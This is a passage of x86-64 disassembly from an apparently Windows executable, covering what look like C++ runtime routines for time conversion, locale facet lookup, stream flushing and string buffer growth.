   14000601f:	4c 03 c0             	add    %rax,%r8
   140006022:	49 69 c0 00 36 6e 01 	imul   $0x16e3600,%r8,%rax
   140006029:	48 2b c8             	sub    %rax,%rcx
   14000602c:	49 8b c6             	mov    %r14,%rax
   14000602f:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   140006036:	48 f7 e9             	imul   %rcx
   140006039:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   14000603d:	48 c1 f8 18          	sar    $0x18,%rax
   140006041:	48 8b c8             	mov    %rax,%rcx
   140006044:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140006048:	48 03 c1             	add    %rcx,%rax
   14000604b:	49 69 c8 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rcx
   140006052:	eb 1b                	jmp    0x14000606f
   140006054:	48 99                	cqto
   140006056:	48 f7 fb             	idiv   %rbx
   140006059:	48 8b c8             	mov    %rax,%rcx
   14000605c:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   140006063:	48 99                	cqto
   140006065:	48 f7 fb             	idiv   %rbx
   140006068:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   14000606f:	48 03 c1             	add    %rcx,%rax
   140006072:	48 8b 0f             	mov    (%rdi),%rcx
   140006075:	48 3b c1             	cmp    %rcx,%rax
   140006078:	7d 47                	jge    0x1400060c1
   14000607a:	48 2b c8             	sub    %rax,%rcx
   14000607d:	48 3b ce             	cmp    %rsi,%rcx
   140006080:	7e 11                	jle    0x140006093
   140006082:	ba 00 5c 26 05       	mov    $0x5265c00,%edx
   140006087:	8b ca                	mov    %edx,%ecx
   140006089:	e8 b6 0a 00 00       	call   0x140006b44
   14000608e:	e9 4d ff ff ff       	jmp    0x140005fe0
   140006093:	48 8b c5             	mov    %rbp,%rax
   140006096:	48 f7 e9             	imul   %rcx
   140006099:	48 c1 fa 12          	sar    $0x12,%rdx
   14000609d:	48 8b c2             	mov    %rdx,%rax
   1400060a0:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400060a4:	48 03 d0             	add    %rax,%rdx
   1400060a7:	48 69 c2 40 42 0f 00 	imul   $0xf4240,%rdx,%rax
   1400060ae:	48 3b c1             	cmp    %rcx,%rax
   1400060b1:	7d 02                	jge    0x1400060b5
   1400060b3:	ff c2                	inc    %edx
   1400060b5:	8b ca                	mov    %edx,%ecx
   1400060b7:	e8 88 0a 00 00       	call   0x140006b44
   1400060bc:	e9 1f ff ff ff       	jmp    0x140005fe0
   1400060c1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400060c6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400060cb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400060d0:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400060d5:	48 83 c4 20          	add    $0x20,%rsp
   1400060d9:	41 5e                	pop    %r14
   1400060db:	c3                   	ret
   1400060dc:	cc                   	int3
   1400060dd:	cc                   	int3
   1400060de:	cc                   	int3
   1400060df:	cc                   	int3
   1400060e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400060e5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400060ea:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400060ef:	57                   	push   %rdi
   1400060f0:	48 83 ec 40          	sub    $0x40,%rsp
   1400060f4:	48 8b 05 45 7f 00 00 	mov    0x7f45(%rip),%rax        # 0x14000e040
   1400060fb:	48 33 c4             	xor    %rsp,%rax
   1400060fe:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006103:	48 8b e9             	mov    %rcx,%rbp
   140006106:	33 d2                	xor    %edx,%edx
   140006108:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000610d:	ff 15 95 30 00 00    	call   *0x3095(%rip)        # 0x1400091a8
   140006113:	90                   	nop
   140006114:	48 8b 05 5d 88 00 00 	mov    0x885d(%rip),%rax        # 0x14000e978
   14000611b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006120:	48 8b 1d a9 30 00 00 	mov    0x30a9(%rip),%rbx        # 0x1400091d0
   140006127:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   14000612b:	75 2d                	jne    0x14000615a
   14000612d:	33 d2                	xor    %edx,%edx
   14000612f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006134:	ff 15 6e 30 00 00    	call   *0x306e(%rip)        # 0x1400091a8
   14000613a:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   14000613e:	75 0f                	jne    0x14000614f
   140006140:	48 8b 05 81 30 00 00 	mov    0x3081(%rip),%rax        # 0x1400091c8
   140006147:	ff 00                	incl   (%rax)
   140006149:	48 63 00             	movslq (%rax),%rax
   14000614c:	48 89 03             	mov    %rax,(%rbx)
   14000614f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006154:	ff 15 46 30 00 00    	call   *0x3046(%rip)        # 0x1400091a0
   14000615a:	48 8b 33             	mov    (%rbx),%rsi
   14000615d:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140006161:	48 8d 3c f5 00 00 00 	lea    0x0(,%rsi,8),%rdi
   140006168:	00 
   140006169:	48 3b 71 18          	cmp    0x18(%rcx),%rsi
   14000616d:	73 0f                	jae    0x14000617e
   14000616f:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140006173:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140006177:	48 85 db             	test   %rbx,%rbx
   14000617a:	75 68                	jne    0x1400061e4
   14000617c:	eb 02                	jmp    0x140006180
   14000617e:	33 db                	xor    %ebx,%ebx
   140006180:	80 79 24 00          	cmpb   $0x0,0x24(%rcx)
   140006184:	74 14                	je     0x14000619a
   140006186:	ff 15 2c 30 00 00    	call   *0x302c(%rip)        # 0x1400091b8
   14000618c:	48 3b 70 18          	cmp    0x18(%rax),%rsi
   140006190:	73 0d                	jae    0x14000619f
   140006192:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006196:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   14000619a:	48 85 db             	test   %rbx,%rbx
   14000619d:	75 45                	jne    0x1400061e4
   14000619f:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1400061a4:	48 85 db             	test   %rbx,%rbx
   1400061a7:	75 3b                	jne    0x1400061e4
   1400061a9:	48 8b d5             	mov    %rbp,%rdx
   1400061ac:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400061b1:	ff 15 89 30 00 00    	call   *0x3089(%rip)        # 0x140009240
   1400061b7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400061bb:	74 57                	je     0x140006214
   1400061bd:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1400061c2:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400061c7:	48 8b cb             	mov    %rbx,%rcx
   1400061ca:	e8 35 09 00 00       	call   0x140006b04
   1400061cf:	48 8b 03             	mov    (%rbx),%rax
   1400061d2:	48 8b cb             	mov    %rbx,%rcx
   1400061d5:	ff 50 08             	call   *0x8(%rax)
   1400061d8:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1400061dd:	48 89 1d 94 87 00 00 	mov    %rbx,0x8794(%rip)        # 0x14000e978
   1400061e4:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400061e9:	ff 15 b1 2f 00 00    	call   *0x2fb1(%rip)        # 0x1400091a0
   1400061ef:	48 8b c3             	mov    %rbx,%rax
   1400061f2:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400061f7:	48 33 cc             	xor    %rsp,%rcx
   1400061fa:	e8 01 0b 00 00       	call   0x140006d00
   1400061ff:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140006204:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140006209:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000620e:	48 83 c4 40          	add    $0x40,%rsp
   140006212:	5f                   	pop    %rdi
   140006213:	c3                   	ret
   140006214:	e8 17 b0 ff ff       	call   0x140001230
   140006219:	90                   	nop
   14000621a:	cc                   	int3
   14000621b:	cc                   	int3
   14000621c:	cc                   	int3
   14000621d:	cc                   	int3
   14000621e:	cc                   	int3
   14000621f:	cc                   	int3
   140006220:	40 53                	rex push %rbx
   140006222:	48 83 ec 20          	sub    $0x20,%rsp
   140006226:	48 8b d9             	mov    %rcx,%rbx
   140006229:	ff 15 91 2f 00 00    	call   *0x2f91(%rip)        # 0x1400091c0
   14000622f:	84 c0                	test   %al,%al
   140006231:	75 0a                	jne    0x14000623d
   140006233:	48 8b 0b             	mov    (%rbx),%rcx
   140006236:	ff 15 ec 2f 00 00    	call   *0x2fec(%rip)        # 0x140009228
   14000623c:	90                   	nop
   14000623d:	48 8b 13             	mov    (%rbx),%rdx
   140006240:	48 8b 02             	mov    (%rdx),%rax
   140006243:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006247:	48 8b 4c 11 48       	mov    0x48(%rcx,%rdx,1),%rcx
   14000624c:	48 85 c9             	test   %rcx,%rcx
   14000624f:	74 07                	je     0x140006258
   140006251:	48 8b 01             	mov    (%rcx),%rax
   140006254:	ff 50 10             	call   *0x10(%rax)
   140006257:	90                   	nop
   140006258:	48 83 c4 20          	add    $0x20,%rsp
   14000625c:	5b                   	pop    %rbx
   14000625d:	c3                   	ret
   14000625e:	cc                   	int3
   14000625f:	cc                   	int3
   140006260:	48 8b 09             	mov    (%rcx),%rcx
   140006263:	48 85 c9             	test   %rcx,%rcx
   140006266:	74 0b                	je     0x140006273
   140006268:	48 8b 01             	mov    (%rcx),%rax
   14000626b:	ba 01 00 00 00       	mov    $0x1,%edx
   140006270:	48 ff 20             	rex.W jmp *(%rax)
   140006273:	c3                   	ret
   140006274:	cc                   	int3
   140006275:	cc                   	int3
   140006276:	cc                   	int3
   140006277:	cc                   	int3
   140006278:	cc                   	int3
   140006279:	cc                   	int3
   14000627a:	cc                   	int3
   14000627b:	cc                   	int3
   14000627c:	cc                   	int3
   14000627d:	cc                   	int3
   14000627e:	cc                   	int3
   14000627f:	cc                   	int3
   140006280:	40 53                	rex push %rbx
   140006282:	48 83 ec 60          	sub    $0x60,%rsp
   140006286:	48 8b 05 b3 7d 00 00 	mov    0x7db3(%rip),%rax        # 0x14000e040
   14000628d:	48 33 c4             	xor    %rsp,%rax
   140006290:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140006295:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000629a:	48 8b d9             	mov    %rcx,%rbx
   14000629d:	0f 84 b0 00 00 00    	je     0x140006353
   1400062a3:	80 79 71 00          	cmpb   $0x0,0x71(%rcx)
   1400062a7:	0f 84 a6 00 00 00    	je     0x140006353
   1400062ad:	48 8b 01             	mov    (%rcx),%rax
   1400062b0:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400062b5:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   1400062ba:	ff 50 18             	call   *0x18(%rax)
   1400062bd:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400062c0:	0f 84 89 00 00 00    	je     0x14000634f
   1400062c6:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   1400062ca:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400062cf:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   1400062d3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400062d8:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400062dd:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   1400062e2:	ff 15 50 2f 00 00    	call   *0x2f50(%rip)        # 0x140009238
   1400062e8:	85 c0                	test   %eax,%eax
   1400062ea:	74 28                	je     0x140006314
   1400062ec:	83 e8 01             	sub    $0x1,%eax
   1400062ef:	74 27                	je     0x140006318
   1400062f1:	83 f8 02             	cmp    $0x2,%eax
   1400062f4:	75 59                	jne    0x14000634f
   1400062f6:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   1400062fa:	b0 01                	mov    $0x1,%al
   1400062fc:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140006301:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140006306:	48 33 cc             	xor    %rsp,%rcx
   140006309:	e8 f2 09 00 00       	call   0x140006d00
   14000630e:	48 83 c4 60          	add    $0x60,%rsp
   140006312:	5b                   	pop    %rbx
   140006313:	c3                   	ret
   140006314:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140006318:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000631d:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140006322:	48 2b f8             	sub    %rax,%rdi
   140006325:	74 1f                	je     0x140006346
   140006327:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   14000632e:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140006333:	4c 8b c7             	mov    %rdi,%r8
   140006336:	ba 01 00 00 00       	mov    $0x1,%edx
   14000633b:	ff 15 2f 32 00 00    	call   *0x322f(%rip)        # 0x140009570
   140006341:	48 3b f8             	cmp    %rax,%rdi
   140006344:	75 09                	jne    0x14000634f
   140006346:	80 7b 71 00          	cmpb   $0x0,0x71(%rbx)
   14000634a:	0f 94 c0             	sete   %al
   14000634d:	eb ad                	jmp    0x1400062fc
   14000634f:	32 c0                	xor    %al,%al
   140006351:	eb a9                	jmp    0x1400062fc
   140006353:	b0 01                	mov    $0x1,%al
   140006355:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000635a:	48 33 cc             	xor    %rsp,%rcx
   14000635d:	e8 9e 09 00 00       	call   0x140006d00
   140006362:	48 83 c4 60          	add    $0x60,%rsp
   140006366:	5b                   	pop    %rbx
   140006367:	c3                   	ret
   140006368:	cc                   	int3
   140006369:	cc                   	int3
   14000636a:	cc                   	int3
   14000636b:	cc                   	int3
   14000636c:	cc                   	int3
   14000636d:	cc                   	int3
   14000636e:	cc                   	int3
   14000636f:	cc                   	int3
   140006370:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006375:	57                   	push   %rdi
   140006376:	48 83 ec 20          	sub    $0x20,%rsp
   14000637a:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140006381:	00 
   140006382:	48 8b f9             	mov    %rcx,%rdi
   140006385:	74 5e                	je     0x1400063e5
   140006387:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   14000638b:	48 8d 41 70          	lea    0x70(%rcx),%rax
   14000638f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140006394:	49 39 00             	cmp    %rax,(%r8)
   140006397:	75 20                	jne    0x1400063b9
   140006399:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   1400063a0:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   1400063a7:	49 89 08             	mov    %rcx,(%r8)
   1400063aa:	2b d1                	sub    %ecx,%edx
   1400063ac:	48 8b 47 38          	mov    0x38(%rdi),%rax
   1400063b0:	48 89 08             	mov    %rcx,(%rax)
   1400063b3:	48 8b 47 50          	mov    0x50(%rdi),%rax
   1400063b7:	89 10                	mov    %edx,(%rax)
   1400063b9:	48 8b cf             	mov    %rdi,%rcx
   1400063bc:	e8 bf fe ff ff       	call   0x140006280
   1400063c1:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400063c8:	33 db                	xor    %ebx,%ebx
   1400063ca:	84 c0                	test   %al,%al
   1400063cc:	48 0f 45 df          	cmovne %rdi,%rbx
   1400063d0:	ff 15 da 31 00 00    	call   *0x31da(%rip)        # 0x1400095b0
   1400063d6:	33 f6                	xor    %esi,%esi
   1400063d8:	85 c0                	test   %eax,%eax
   1400063da:	48 0f 44 f3          	cmove  %rbx,%rsi
   1400063de:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400063e3:	eb 02                	jmp    0x1400063e7
   1400063e5:	33 f6                	xor    %esi,%esi
   1400063e7:	48 8b cf             	mov    %rdi,%rcx
   1400063ea:	c6 47 7c 00          	movb   $0x0,0x7c(%rdi)
   1400063ee:	c6 47 71 00          	movb   $0x0,0x71(%rdi)
   1400063f2:	ff 15 28 2e 00 00    	call   *0x2e28(%rip)        # 0x140009220
   1400063f8:	48 8b 0d 81 85 00 00 	mov    0x8581(%rip),%rcx        # 0x14000e980
   1400063ff:	48 8b c6             	mov    %rsi,%rax
   140006402:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006407:	48 89 4f 74          	mov    %rcx,0x74(%rdi)
   14000640b:	48 c7 87 80 00 00 00 	movq   $0x0,0x80(%rdi)
   140006412:	00 00 00 00 
   140006416:	48 c7 47 68 00 00 00 	movq   $0x0,0x68(%rdi)
   14000641d:	00 
   14000641e:	48 83 c4 20          	add    $0x20,%rsp
   140006422:	5f                   	pop    %rdi
   140006423:	c3                   	ret
   140006424:	cc                   	int3
   140006425:	cc                   	int3
   140006426:	cc                   	int3
   140006427:	cc                   	int3
   140006428:	cc                   	int3
   140006429:	cc                   	int3
   14000642a:	cc                   	int3
   14000642b:	cc                   	int3
   14000642c:	cc                   	int3
   14000642d:	cc                   	int3
   14000642e:	cc                   	int3
   14000642f:	cc                   	int3
   140006430:	40 53                	rex push %rbx
   140006432:	48 83 ec 20          	sub    $0x20,%rsp
   140006436:	48 8b d9             	mov    %rcx,%rbx
   140006439:	ff 11                	call   *(%rcx)
   14000643b:	ff 15 af 2d 00 00    	call   *0x2daf(%rip)        # 0x1400091f0
   140006441:	ba 08 00 00 00       	mov    $0x8,%edx
   140006446:	48 8b cb             	mov    %rbx,%rcx
   140006449:	e8 d2 08 00 00       	call   0x140006d20
   14000644e:	33 c0                	xor    %eax,%eax
   140006450:	48 83 c4 20          	add    $0x20,%rsp
   140006454:	5b                   	pop    %rbx
   140006455:	c3                   	ret
   140006456:	cc                   	int3
   140006457:	cc                   	int3
   140006458:	cc                   	int3
   140006459:	cc                   	int3
   14000645a:	cc                   	int3
   14000645b:	cc                   	int3
   14000645c:	cc                   	int3
   14000645d:	cc                   	int3
   14000645e:	cc                   	int3
   14000645f:	cc                   	int3
   140006460:	40 53                	rex push %rbx
   140006462:	55                   	push   %rbp
   140006463:	56                   	push   %rsi
   140006464:	41 57                	push   %r15
   140006466:	48 83 ec 38          	sub    $0x38,%rsp
   14000646a:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000646e:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140006475:	ff ff 7f 
   140006478:	48 8b c3             	mov    %rbx,%rax
   14000647b:	45 0f b6 f9          	movzbl %r9b,%r15d
   14000647f:	48 2b c5             	sub    %rbp,%rax
   140006482:	48 8b f1             	mov    %rcx,%rsi
   140006485:	48 83 f8 01          	cmp    $0x1,%rax
   140006489:	0f 82 39 01 00 00    	jb     0x1400065c8
   14000648f:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140006494:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   140006499:	4c 8d 65 01          	lea    0x1(%rbp),%r12
   14000649d:	49 8b d4             	mov    %r12,%rdx
   1400064a0:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400064a5:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400064a9:	48 83 ca 0f          	or     $0xf,%rdx
   1400064ad:	48 3b d3             	cmp    %rbx,%rdx
   1400064b0:	77 44                	ja     0x1400064f6
   1400064b2:	49 8b ce             	mov    %r14,%rcx
   1400064b5:	48 8b c3             	mov    %rbx,%rax
   1400064b8:	48 d1 e9             	shr    $1,%rcx
   1400064bb:	48 2b c1             	sub    %rcx,%rax
   1400064be:	4c 3b f0             	cmp    %rax,%r14
   1400064c1:	77 33                	ja     0x1400064f6
   1400064c3:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   1400064c7:	48 8b da             	mov    %rdx,%rbx
   1400064ca:	48 3b d0             	cmp    %rax,%rdx
   1400064cd:	48 0f 42 d8          	cmovb  %rax,%rbx
   1400064d1:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400064d5:	48 85 c9             	test   %rcx,%rcx
   1400064d8:	75 04                	jne    0x1400064de
   1400064da:	33 ff                	xor    %edi,%edi
   1400064dc:	eb 49                	jmp    0x140006527
   1400064de:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1400064e5:	72 38                	jb     0x14000651f
   1400064e7:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400064eb:	48 3b c1             	cmp    %rcx,%rax
   1400064ee:	0f 86 da 00 00 00    	jbe    0x1400065ce
   1400064f4:	eb 0e                	jmp    0x140006504
   1400064f6:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1400064fd:	00 00 80 
   140006500:	48 83 c0 27          	add    $0x27,%rax
   140006504:	48 8b c8             	mov    %rax,%rcx
   140006507:	e8 1c 08 00 00       	call   0x140006d28
   14000650c:	48 85 c0             	test   %rax,%rax
   14000650f:	74 6d                	je     0x14000657e
   140006511:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140006515:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140006519:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000651d:	eb 08                	jmp    0x140006527
   14000651f:	e8 04 08 00 00       	call   0x140006d28
   140006524:	48 8b f8             	mov    %rax,%rdi
   140006527:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   14000652b:	4c 8b c5             	mov    %rbp,%r8
   14000652e:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140006532:	48 8b cf             	mov    %rdi,%rcx
   140006535:	49 83 fe 0f          	cmp    $0xf,%r14
   140006539:	76 5d                	jbe    0x140006598
   14000653b:	48 8b 1e             	mov    (%rsi),%rbx
   14000653e:	48 8b d3             	mov    %rbx,%rdx
   140006541:	e8 75 17 00 00       	call   0x140007cbb
   140006546:	49 8d 56 01          	lea    0x1(%r14),%rdx
   14000654a:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   14000654e:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   140006553:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000655a:	72 18                	jb     0x140006574
   14000655c:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140006560:	48 83 c2 27          	add    $0x27,%rdx
   140006564:	48 2b d8             	sub    %rax,%rbx
   140006567:	48 83 eb 08          	sub    $0x8,%rbx
   14000656b:	48 83 fb 1f          	cmp    $0x1f,%rbx
   14000656f:	77 0d                	ja     0x14000657e
   140006571:	48 8b d8             	mov    %rax,%rbx
   140006574:	48 8b cb             	mov    %rbx,%rcx
   140006577:	e8 a4 07 00 00       	call   0x140006d20
   14000657c:	eb 2b                	jmp    0x1400065a9
   14000657e:	45 33 c9             	xor    %r9d,%r9d
   140006581:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006588:	00 00 
   14000658a:	45 33 c0             	xor    %r8d,%r8d
   14000658d:	33 d2                	xor    %edx,%edx
   14000658f:	33 c9                	xor    %ecx,%ecx
   140006591:	ff 15 a9 2f 00 00    	call   *0x2fa9(%rip)        # 0x140009540
   140006597:	cc                   	int3
   140006598:	48 8b d6             	mov    %rsi,%rdx
   14000659b:	e8 1b 17 00 00       	call   0x140007cbb
   1400065a0:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   1400065a4:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   1400065a9:	48 89 3e             	mov    %rdi,(%rsi)
   1400065ac:	48 8b c6             	mov    %rsi,%rax
   1400065af:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   1400065b4:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400065b9:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   1400065be:	48 83 c4 38          	add    $0x38,%rsp
   1400065c2:	41 5f                	pop    %r15
   1400065c4:	5e                   	pop    %rsi
   1400065c5:	5d                   	pop    %rbp
   1400065c6:	5b                   	pop    %rbx
   1400065c7:	c3                   	ret
   1400065c8:	e8 e3 ad ff ff       	call   0x1400013b0
   1400065cd:	cc                   	int3
   1400065ce:	e8 bd ac ff ff       	call   0x140001290
   1400065d3:	cc                   	int3
   1400065d4:	cc                   	int3
   1400065d5:	cc                   	int3
   1400065d6:	cc                   	int3
   1400065d7:	cc                   	int3
   1400065d8:	cc                   	int3
   1400065d9:	cc                   	int3
   1400065da:	cc                   	int3
   1400065db:	cc                   	int3
   1400065dc:	cc                   	int3
   1400065dd:	cc                   	int3
   1400065de:	cc                   	int3
   1400065df:	cc                   	int3
   1400065e0:	40 53                	rex push %rbx
   1400065e2:	55                   	push   %rbp
   1400065e3:	56                   	push   %rsi
   1400065e4:	48 83 ec 40          	sub    $0x40,%rsp
   1400065e8:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   1400065ec:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400065f3:	ff ff 7f 
   1400065f6:	48 8b c3             	mov    %rbx,%rax
   1400065f9:	48 8b f1             	mov    %rcx,%rsi
   1400065fc:	48 2b c5             	sub    %rbp,%rax
   1400065ff:	48 3b c2             	cmp    %rdx,%rax
   140006602:	0f 82 6d 01 00 00    	jb     0x140006775
   140006608:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   14000660d:	4c 89 64 24 78       	mov    %r12,0x78(%rsp)
   140006612:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140006617:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   14000661b:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140006620:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   140006624:	49 8b d7             	mov    %r15,%rdx
   140006627:	48 83 ca 0f          	or     $0xf,%rdx
   14000662b:	48 3b d3             	cmp    %rbx,%rdx
   14000662e:	77 44                	ja     0x140006674
   140006630:	49 8b ce             	mov    %r14,%rcx
   140006633:	48 8b c3             	mov    %rbx,%rax
   140006636:	48 d1 e9             	shr    $1,%rcx
   140006639:	48 2b c1             	sub    %rcx,%rax
   14000663c:	4c 3b f0             	cmp    %rax,%r14
   14000663f:	77 33                	ja     0x140006674
   140006641:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140006645:	48 8b da             	mov    %rdx,%rbx
   140006648:	48 3b d0             	cmp    %rax,%rdx
   14000664b:	48 0f 42 d8          	cmovb  %rax,%rbx
   14000664f:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140006653:	48 85 c9             	test   %rcx,%rcx
   140006656:	75 04                	jne    0x14000665c
   140006658:	33 ff                	xor    %edi,%edi
   14000665a:	eb 4d                	jmp    0x1400066a9
   14000665c:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140006663:	72 3c                	jb     0x1400066a1
   140006665:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140006669:	48 3b c1             	cmp    %rcx,%rax
   14000666c:	0f 86 09 01 00 00    	jbe    0x14000677b
   140006672:	eb 0e                	jmp    0x140006682
   140006674:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000667b:	00 00 80 
   14000667e:	48 83 c0 27          	add    $0x27,%rax
   140006682:	48 8b c8             	mov    %rax,%rcx
   140006685:	e8 9e 06 00 00       	call   0x140006d28
   14000668a:	48 85 c0             	test   %rax,%rax
   14000668d:	0f 84 87 00 00 00    	je     0x14000671a
   140006693:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140006697:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   14000669b:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000669f:	eb 08                	jmp    0x1400066a9
   1400066a1:	e8 82 06 00 00       	call   0x140006d28
   1400066a6:	48 8b f8             	mov    %rax,%rdi
   1400066a9:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   1400066b0:	00 
   1400066b1:	4c 8b c5             	mov    %rbp,%r8
   1400066b4:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   1400066b8:	4c 8d 3c 2f          	lea    (%rdi,%rbp,1),%r15
   1400066bc:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1400066c0:	48 8b cf             	mov    %rdi,%rcx
   1400066c3:	49 83 fe 0f          	cmp    $0xf,%r14
   1400066c7:	76 6b                	jbe    0x140006734
   1400066c9:	48 8b 1e             	mov    (%rsi),%rbx
   1400066cc:	48 8b d3             	mov    %rbx,%rdx
   1400066cf:	e8 e7 15 00 00       	call   0x140007cbb
   1400066d4:	4d 8b c4             	mov    %r12,%r8
   1400066d7:	48 8d 15 da 36 00 00 	lea    0x36da(%rip),%rdx        # 0x140009db8
   1400066de:	49 8b cf             	mov    %r15,%rcx
   1400066e1:	e8 d5 15 00 00       	call   0x140007cbb
   1400066e6:	49 8d 56 01          	lea    0x1(%r14),%rdx
   1400066ea:	43 c6 04 27 00       	movb   $0x0,(%r15,%r12,1)
   1400066ef:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400066f6:	72 18                	jb     0x140006710
   1400066f8:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400066fc:	48 83 c2 27          	add    $0x27,%rdx
   140006700:	48 2b d8             	sub    %rax,%rbx
   140006703:	48 83 eb 08          	sub    $0x8,%rbx
   140006707:	48 83 fb 1f          	cmp    $0x1f,%rbx
   14000670b:	77 0d                	ja     0x14000671a
   14000670d:	48 8b d8             	mov    %rax,%rbx
   140006710:	48 8b cb             	mov    %rbx,%rcx
